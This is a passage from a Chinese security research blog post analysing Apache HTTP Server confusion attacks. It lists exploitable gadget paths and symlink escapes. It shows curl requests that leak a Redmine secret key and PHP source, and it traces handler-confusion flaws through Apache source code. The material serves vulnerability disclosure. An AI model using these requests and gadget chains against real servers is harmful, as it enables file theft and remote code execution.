</span></code></pre></div></div>

<p>所以我們的「任意檔案存取」似乎有點那麼地不任意。 不過我們打破原本只能瀏覽 DocumentRoot 的信任算是跨出很大的一步了。 接下來要做的事情就是「壓榨」這個目錄內的各種可能。　所有可利用的資源、目錄中現有的教學範例、說明文件、單元測試檔案，甚至伺服器上程式語言如 PHP、Python 甚至 PHP 的模組都有機會成為我們濫用的對象！</p>

<p><em>P.S. 當然上面只是基於 Ubuntu/Debian 作業系統發行的 Httpd 版本設定做解釋，實務上也有發現一些應用軟體直接把的根目錄的 <code class="language-plaintext highlighter-rouge">Require all denied</code> 移除導致可以直接存取 <code class="language-plaintext highlighter-rouge">/etc/passwd</code></em></p>

<p><img src="/assets/img/blog/20240809/3.png" alt="" /></p>

<h5 id="️-2-2-1-local-gadget-to-information-disclosure">✔️ 2-2-1. Local Gadget to Information Disclosure</h5>

<p>首先來尋找看看這個目錄下是否存在這一些檔案是可以利用的。 首先是目標 Apache HTTP Server 如果安裝 <code class="language-plaintext highlighter-rouge">websocketd</code> 這個服務的話，服務套件預設會在 <code class="language-plaintext highlighter-rouge">/usr/share/doc/websocketd/examples/php/</code> 下放置一個範例 PHP 程式碼 <code class="language-plaintext highlighter-rouge">dump-env.php</code>，如果目標伺服器上存在 PHP 環境的話可以直接存取這個範例程式去洩漏敏感的環境變數。</p>

<p>另外如果目標同時安裝如 Nginx 或是 Jetty 的話，雖然 <code class="language-plaintext highlighter-rouge">/usr/share</code> 理論上該是套件安裝時所存放的唯讀複本，但這些服務的預設 Web Root 就在 <code class="language-plaintext highlighter-rouge">/usr/share</code> 下，因此也能透過這個攻擊手法去洩漏這些網頁應用的敏感資訊，例如 Jetty 上的 <code class="language-plaintext highlighter-rouge">web.xml</code> 設定等等：</p>

<ul>
  <li>/usr/share/nginx/html/</li>
  <li>/usr/share/jetty9/etc/</li>
  <li>/usr/share/jetty9/webapps/</li>
</ul>

<p>這裡簡單展示一個透過存取 <code class="language-plaintext highlighter-rouge">Davical</code> 套件所存在的 <code class="language-plaintext highlighter-rouge">setup.php</code> 唯讀複本去洩漏 <code class="language-plaintext highlighter-rouge">phpinfo()</code> 內容。</p>

<p><img src="/assets/img/blog/20240809/4.png" alt="" /></p>

<h5 id="️-2-2-2-local-gadget-to-xss">✔️ 2-2-2. Local Gadget to XSS</h5>

<p>接著如何把這個攻擊手法轉化成 XSS 呢？ 在 Ubuntu Desktop 環境中預設會安裝 LibreOffice 這套開源的辦公室應用，利用其中幫助文件的語言切換功能來完成 XSS。</p>

<p><strong><em>Path: /usr/share/libreoffice/help/help.html</em></strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// the URL came from LibreOffice help (F1)</span>
        <span class="kd">var</span> <span class="nx">version</span> <span class="o">=</span> <span class="nx">getParameterByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">Version</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">url</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">newURL</span> <span class="o">=</span> <span class="nx">version</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/index.html?</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">query</span><span class="p">;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">newURL</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">latest/index.html</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>因此就算目標沒有部署任何網頁應用，我們也可以利用一個不安全的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 透過作業系統自帶的檔案來創造出 XSS。</p>

<p><img src="/assets/img/blog/20240809/5.png" alt="" /></p>

<h5 id="️-2-2-3-local-gadget-to-lfi">✔️ 2-2-3. Local Gadget to LFI</h5>

<p>至於任意檔案讀取呢？ 如果目標伺服器上安裝了一些 PHP 甚至前端應用套件，例如 JpGraph、jQuery-jFeed 甚至 WordPress 或 Moodle 外掛，那麼它們自帶的使用教學或是除錯用程式碼都可以變成利用的對象，例如：</p>

<ul>
  <li>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</li>
  <li>/usr/share/javascript/jquery-jfeed/proxy.php</li>
  <li>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</li>
</ul>

<p>這裡展示利用 jQuery-jFeed 所自帶的 <code class="language-plaintext highlighter-rouge">proxy.php</code> 來讀取 <code class="language-plaintext highlighter-rouge">/etc/passwd</code>：</p>

<p><img src="/assets/img/blog/20240809/6.png" alt="" /></p>

<h5 id="️-2-2-4-local-gadget-to-ssrf">✔️ 2-2-4. Local Gadget to SSRF</h5>

<p>當然找到一個 SSRF 也不在話下，例如 MagpieRSS 提供了一個 <code class="language-plaintext highlighter-rouge">magpie_debug.php</code> 檔案就是一個絕佳的小工具：</p>

<ul>
  <li>/usr/share/php/magpierss/scripts/magpie_debug.php</li>
</ul>

<h5 id="️-2-2-5-local-gadget-to-rce">✔️ 2-2-5. Local Gadget to RCE</h5>

<p>所以能 RCE 嗎？ 別急我們先慢慢來！ 首先這個攻擊手法已經可以把既有的攻擊面全部重新套用一次了，例如在某次開發過程中不小心被遺留下來 (甚至可能還是被第三方套件所依賴的) 的舊版本 PHPUnit，可以直接使用 <a href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841">CVE-2017-9841</a> 來執行任意程式碼，又或者是安裝完 phpLiteAdmin (由於是唯讀副本所以預設密碼是 <code class="language-plaintext highlighter-rouge">admin</code>)，相信看到這邊會發現 Local Gadgets Manipulation 這個攻擊手法存在著無窮潛力，剩下只是發掘出更厲害以及更通用的小工具！</p>

<p><br /></p>

<h4 id="️-primitive-2-3-jailbreak-from-local-gadgets">⚔️ Primitive 2-3. Jailbreak from Local Gadgets</h4>

<p>看到這裡你可能會好奇： 「真的不能跳出 <code class="language-plaintext highlighter-rouge">/usr/share</code> 嗎？」 當然可以，這也是要介紹的第三個攻擊手法 —— <strong>從 <code class="language-plaintext highlighter-rouge">/usr/share</code> 中越獄！</strong></p>

<p><a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160">Debian/Ubuntu</a> 的 Httpd 發行版中預設開啟了 <code class="language-plaintext highlighter-rouge">FollowSymLinks</code> 選項，就算非 Debian/Ubuntu 發行版但 Apache HTTP Server 也隱含地預設<a href="https://httpd.apache.org/docs/current/mod/core.html#options">允許符號連結</a>。</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /</span><span class="p">&gt;
</span>    <span class="nc">Options</span> <span class="ss">FollowSymLinks</span>
    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> denied
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<h5 id="️-2-3-1-jailbreak-from-local-gadgets">✔️ 2-3-1. Jailbreak from Local Gadgets</h5>

<p>因此只要有套件在它的安裝目錄下符號連結到 <code class="language-plaintext highlighter-rouge">/usr/share</code> 外，這個符號連結就成為一個跳板去存取更多的小工具完成更多的利用。 這裡列出一些我們已經發現可利用的符號連結：</p>

<ul>
  <li><strong>Cacti Log</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/cacti/site/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/log/cacti/</code></li>
  <li><strong>Solr Data</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/solr/data/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/lib/solr/data</code></li>
  <li><strong>Solr Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/solr/conf/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/etc/solr/conf/</code></li>
  <li><strong>MediaWiki Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/mediawiki/config/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/lib/mediawiki/config/</code></li>
  <li><strong>SimpleSAMLphp Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/simplesamlphp/config/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/etc/simplesamlphp/</code></li>
</ul>

<h5 id="️-2-3-2-jailbreak-local-gadgets-to-redmine-rce">✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE</h5>

<p>越獄攻擊手法的最後讓我們展示一個利用 Redmine 的雙層符號連結跳躍去完成 RCE 的例子。 在預設安裝的 Redmine 程式碼目錄中有個 <code class="language-plaintext highlighter-rouge">instances/</code> 目錄指向 <code class="language-plaintext highlighter-rouge">/var/lib/redmine/</code>，而位於 <code class="language-plaintext highlighter-rouge">/var/lib/redmine/</code> 下的 <code class="language-plaintext highlighter-rouge">default/config/</code> 目錄又指向 <code class="language-plaintext highlighter-rouge">/etc/redmine/default/</code> 資料夾，裡面存放著 Redmine 的資料庫設定以及應用程式私密金鑰。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file /usr/share/redmine/instances/
 symbolic <span class="nb">link </span>to /var/lib/redmine/
<span class="nv">$ </span>file /var/lib/redmine/config/
 symbolic <span class="nb">link </span>to /etc/redmine/default/
<span class="nv">$ </span><span class="nb">ls</span> /etc/redmine/default/
 database.yml    secret_key.txt
</code></pre></div></div>

<p>於是透過一個不安全的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 以及兩層符號連結，我們能夠輕鬆存取到 Redmine 所使用的應用程式金鑰：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 <span class="o">(</span>Ubuntu<span class="o">)</span> 
 ...
 6d222c3c3a1881c865428edb79a74405
</code></pre></div></div>

<p>而 Redmine 又是基於 Ruby on Rails 所開發的應用程式，其中 <code class="language-plaintext highlighter-rouge">secret_key.txt</code> 的內容其實正是其簽章加密所使用到的金鑰，接下來的流程相信對<a href="https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view">熟悉攻擊 RoR 的同學</a>應該不陌生，透過已知的金鑰將惡意 Marshal 物件簽章加密後嵌入 Cookie，接著透過伺服器端的反序列化最終實現遠端程式碼執行！</p>

<p><img src="/assets/img/blog/20240809/7.png" alt="" /></p>

<p><br /></p>

<h3 id="-3-handler-confusion">🔥 3. Handler Confusion</h3>

<p>最後一個要介紹的攻擊是 Handler 上的 Confusion。 這個攻擊同樣也利用了一個 Apache HTTP Server 從上古時期架構所遺留下來的技術債。這裡透過一個例子來讓讀者快速的了解這個技術債 —— 如果今天想在 Httpd 上運行經典的 <code class="language-plaintext highlighter-rouge">mod_php</code>，下面兩個語法設定你覺得哪個才是正確的？</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddHandler</span> application/x-httpd-php .php
<span class="nc">AddType</span>    application/x-httpd-php .php
</code></pre></div></div>

<p>答案是 —— 兩個都可以正確地讓 PHP 運行起來！ 這裡分別是兩個設定的語法格式，可以看到兩個設定不僅用法、參數類似，現在連效果都一模一樣，為什麼 Apache HTTP Server 當初要設計兩個不同的語法？</p>

<div class="language-config highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AddHandler</span> <span class="n">handler</span>-<span class="n">name</span> <span class="n">extension</span> [<span class="n">extension</span>] ...
<span class="n">AddType</span> <span class="n">media</span>-<span class="n">type</span> <span class="n">extension</span> [<span class="n">extension</span>] ...
</code></pre></div></div>

<p>實際上 <code class="language-plaintext highlighter-rouge">handler-name</code> 以及 <code class="language-plaintext highlighter-rouge">media-type</code> 在 Httpd 的內部結構中代表著不同的欄位，分別對應到 <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> 以及 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code>。 而<strong>使用者可以在沒有感知的情況下使用則歸功於一段從 <a href="https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c">1996 年</a> Apache HTTP Server 開發初期就遺留到現在的程式碼</strong>：</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420">server/config.c#L420</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AP_CORE_DECLARE</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">ap_invoke_handler</span><span class="p">(</span><span class="n">request_rec</span> <span class="o">*</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">// [...]</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">handler</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">p</span><span class="o">=</span><span class="n">ap_strchr_c</span><span class="p">(</span><span class="n">handler</span><span class="p">,</span> <span class="sc">';'</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="o">*</span><span class="n">new_handler</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">apr_pmemdup</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">pool</span><span class="p">,</span> <span class="n">handler</span><span class="p">,</span>
                                                        <span class="n">p</span> <span class="o">-</span> <span class="n">handler</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
                <span class="kt">char</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">new_handler</span> <span class="o">+</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">handler</span><span class="p">);</span>
                <span class="n">handler</span> <span class="o">=</span> <span class="n">new_handler</span><span class="p">;</span>

                <span class="cm">/* exclude media type arguments */</span>
                <span class="k">while</span> <span class="p">(</span><span class="n">p2</span> <span class="o">&gt;</span> <span class="n">handler</span> <span class="o">&amp;&amp;</span> <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span><span class="p">)</span>
                    <span class="o">--</span><span class="n">p2</span><span class="p">;</span> <span class="cm">/* strip trailing spaces */</span>

                <span class="o">*</span><span class="n">p2</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">handler</span> <span class="o">=</span> <span class="n">AP_DEFAULT_HANDLER_NAME</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">=</span> <span class="n">handler</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">ap_run_handler</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
</code></pre></div></div>

<p>可以看到在進入主要的模組處理器 <code class="language-plaintext highlighter-rouge">ap_run_handler()</code> 之前，如果請求中的 <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> 為空則把結構中 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 欄位的內容當成最終將被使用的模組處理器。 這也就是為什麼 <code class="language-plaintext highlighter-rouge">AddType</code> 以及 <code class="language-plaintext highlighter-rouge">AddHandler</code> 效果一致的主要理由，因為 <code class="language-plaintext highlighter-rouge">media-type</code> 最終在執行前還是會被轉換成 <code class="language-plaintext highlighter-rouge">handler-name</code>。 我們的第三個 Handler Confusion 主要也就是圍繞在這個行為所發展出來的攻擊。</p>

<p><br /></p>

<h4 id="️-primitive-3-1-overwrite-the-handler">⚔️ Primitive 3-1. Overwrite the Handler</h4>

<p>在理解這個轉換機制後首先第一個攻擊手法是 —— <strong>Overwrite the Handler</strong>，想像一下如果今天目標的 Apache HTTP Server 透過 <code class="language-plaintext highlighter-rouge">AddType</code> 將 PHP 運行起來。</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddType</span> application/x-httpd-php  .php
</code></pre></div></div>

<p>在正常的流程中瀏覽 <code class="language-plaintext highlighter-rouge">http://server/config.php</code>。 首先，<code class="language-plaintext highlighter-rouge">mod_mime</code> 會在 <code class="language-plaintext highlighter-rouge">type_checker</code> 階段根據 <code class="language-plaintext highlighter-rouge">AddType</code> 所設定的附檔名將相對應的內容複製到 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 中，由於 <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> 在整個 HTTP 生命週期中並無賦值，於是在執行模組處理器前 <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code> 會將 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 當成模組處理器，最終呼叫 <code class="language-plaintext highlighter-rouge">mod_php</code> 處理請求。</p>

<p>然而如果今天有任何模組在執行到 <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code> 前「不小心」把 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 覆寫掉了，那會發生什麼事呢？</p>

<h5 id="️-3-1-1-overwrite-handler-to-disclose-php-source-code">✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code</h5>

<p>因此這個攻擊手法的第一個利用就是透過這個「不小心」去洩漏任意 PHP 的原始碼。 這個技術最早是由 Max Dmitriev 在 ZeroNights 2021 所發表的研究中提及 (kudos to him!)，演講主題及投影片可以從這邊看到：</p>

<blockquote>
  <p><a href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf">Apache 0day bug, which still nobody knows of, and which was fixed accidentally</a></p>
</blockquote>

<p>Max Dmitriev 觀察到只要送出錯誤的 <code class="language-plaintext highlighter-rouge">Content-Length</code>，遠端 Httpd 伺服器會發生不明的錯誤順帶回傳 PHP 的原始碼，在細追流程後發現其成因是 ModSecurity 在使用 APR (Apache Portable Runtime) 函示庫時並未好好的處理 <code class="language-plaintext highlighter-rouge">AP_FILTER_ERROR</code> 回傳值所導致的 <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a>。 由於發生錯誤時 Httpd 想送出一些 HTML 錯誤訊息，於是 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 也順便被覆寫成 <code class="language-plaintext highlighter-rouge">text/html</code>。</p>

<p><img src="/assets/img/blog/20240809/8.png" alt="" /></p>

<p>由於 ModSecurity 並未妥善的處理回傳值使得本該停止的 Httpd 內部流程繼續執行，而這個「副作用」又會把原本加上的 <code class="language-plaintext highlighter-rouge">Content-Type</code> 給覆寫掉，導致最終該被當成 PHP 的檔案被當成一般文件處理並將其中的程式碼及敏感設定印出。 🤫</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-v</span> http://127.0.0.1/info.php <span class="nt">-H</span> <span class="s2">"Content-Length: x"</span>
<span class="o">&gt;</span> HTTP/1.1 400 Bad Request
<span class="o">&gt;</span> Date: Mon, 29 Jul 2024 05:32:23 GMT
<span class="o">&gt;</span> Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="o">&gt;</span> Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;400 Bad Request&lt;/title&gt;
...
&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;
</code></pre></div></div>

<p>理論上所有基於 <code class="language-plaintext highlighter-rouge">Content-Type</code> 的設定語法都容易遭受此類問題影響，所以除了 Max 在投影片中所展示的 <code class="language-plaintext highlighter-rouge">php-cgi</code> 搭配 <code class="language-plaintext highlighter-rouge">mod_actions</code> 外，純粹的 <code class="language-plaintext highlighter-rouge">mod_php</code> 搭配上 <code class="language-plaintext highlighter-rouge">AddType</code> 也同樣也受影響。</p>

<p>另外值得一提的是，這個副作用在 Apache HTTP Server 版本 2.4.44 時被當成一個<a href="https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a">增進請求解析器</a>的程式錯誤被更正，於是這個「漏洞」就被當成已修復直到我重新撿起它。 但由於其根本成因還是 ModSecurity 並未好好的處理錯誤，只要找到其它條觸發 <code class="language-plaintext highlighter-rouge">AP_FILTER_ERROR</code> 的路徑那同樣的行為還是可以重現成功。</p>

<p><em>P.S. 此問題已於 6/20 透過官方信箱回報給 ModSecurity 並由 Project Co-Leader 建議回到原 <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">GitHub Issue</a> 中討論。</em></p>

<h5 id="️-3-1-2-overwrite-handler-to---">✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████</h5>

<p>基於前面提到的 <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a> 行為以及副作用，這個攻擊手法還可以完成其它更酷的利用，不過由於此問題尚未完全修復，更進一步的利用方式，將於修復完成後再揭露。</p>

<p><br /></p>

<h4 id="️-primitive-3-2-invoke-arbitrary-handlers">⚔️ Primitive 3-2. Invoke Arbitrary Handlers</h4>

<p>仔細思考前面 Overwrite Handler 攻擊手法，雖然是因為 ModSecurity 並未好好的處理錯誤，導致請求被設置上錯誤的 <code class="language-plaintext highlighter-rouge">Content-Type</code>。 但再深入的探究其根本原因應該是 —— <strong>Apache HTTP Server 在使用 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 時，其實無從辨別它的語意，這個欄位既可以是在請求階段被語法設定好的值，也可以是回應階段伺服器回傳 <code class="language-plaintext highlighter-rouge">Content-Type</code> 標頭的內容。</strong></p>

<p>所以理論上如果能控制伺服器回應中 <code class="language-plaintext highlighter-rouge">Content-Type</code> 標頭的內容，那就可以透過那段從開發初期遺留至今的程式碼呼叫任意的模組處理器，這也是 Handler Confusion 的最後一個攻擊手法 —— <strong>呼叫任意 Apache HTTP Server 的內部模組處理器</strong>！</p>

<p>但這裡還有最後的一塊拼圖必須填上，在 Httpd 中所有可以從伺服器回應修改到 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 的地方全都發生在那段遺留程式碼之後，就算修改到該欄位的內容，此時 HTTP 生命週期也進入尾聲，無法再做更進一步的利用…… 嗎？</p>

<p>我們找了 <a href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a> 來當救援投手！ RFC 3875 是一個關於 CGI 的規範，其中 <a href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2">6.2.2. 節</a>定義了一個 Local Redirect Response 行為:</p>

<blockquote>
  <p>The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
</blockquote>

<p>簡單來說規範了 CGI 在特定條件下必須使用伺服器端的資源去處理轉址，仔細檢視 <code class="language-plaintext highlighter-rouge">mod_cgi</code> 對於這個規範的實作會發現：</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983">modules/generators/mod_cgi.c#L983</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">ap_scan_script_header_err_brigade_ex</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">sbuf</span><span class="p">,</span>          <span class="c1">// &lt;------ [1]</span>
                                                    <span class="n">APLOG_MODULE_INDEX</span><span class="p">)))</span>
    <span class="p">{</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">log_script</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">conf</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">dbuf</span><span class="p">,</span> <span class="n">sbuf</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">script_err</span><span class="p">);</span>

        <span class="c1">// [...]</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="n">HTTP_NOT_MODIFIED</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">location</span> <span class="o">=</span> <span class="n">apr_table_get</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">headers_out</span><span class="p">,</span> <span class="s">"Location"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">&amp;&amp;</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">&amp;&amp;</span> <span class="n">location</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span> <span class="o">&amp;&amp;</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>          <span class="c1">// &lt;------ [2]</span>
        <span class="cm">/* This redirect needs to be a GET no matter what the original
         * method was.
         */</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">method</span> <span class="o">=</span> <span class="s">"GET"</span><span class="p">;</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">method_number</span> <span class="o">=</span> <span class="n">M_GET</span><span class="p">;</span>

        <span class="cm">/* We already read the message body (if any), so don't allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */</span>
        <span class="n">apr_table_unset</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">headers_in</span><span class="p">,</span> <span class="s">"Content-Length"</span><span class="p">);</span>

        <span class="n">ap_internal_redirect_handler</span><span class="p">(</span><span class="n">location</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>                     <span class="c1">// &lt;------ [3]</span>
        <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>首先 <code class="language-plaintext highlighter-rouge">mod_cgi</code> 會先執行<sup>[1]</sup> CGI 並掃描其輸出結果並設置上相對應的 <code class="language-plaintext highlighter-rouge">Status</code> 以及 <code class="language-plaintext highlighter-rouge">Content-Type</code>，如果<sup>[2]</sup>回傳的 <code class="language-plaintext highlighter-rouge">Status</code> 是 200 以及 <code class="language-plaintext highlighter-rouge">Location</code> 標頭欄位是 <code class="language-plaintext highlighter-rouge">/</code> 開頭則把這個回應當成一個伺服器端的轉址並開始處理<sup>[3]</sup>。 再仔細審視 <code class="language-plaintext highlighter-rouge">ap_internal_redirect_handler()</code> 的實作會發現：</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800">modules/http/http_request.c#L800</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AP_DECLARE</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">ap_internal_redirect_handler</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">new_uri</span><span class="p">,</span> <span class="n">request_rec</span> <span class="o">*</span><span class="n">r</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">access_status</span><span class="p">;</span>
    <span class="n">request_rec</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="n">internal_internal_redirect</span><span class="p">(</span><span class="n">new_uri</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>    <span class="c1">// &lt;------ [1]</span>

    <span class="cm">/* ap_die was already called, if an error occured */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
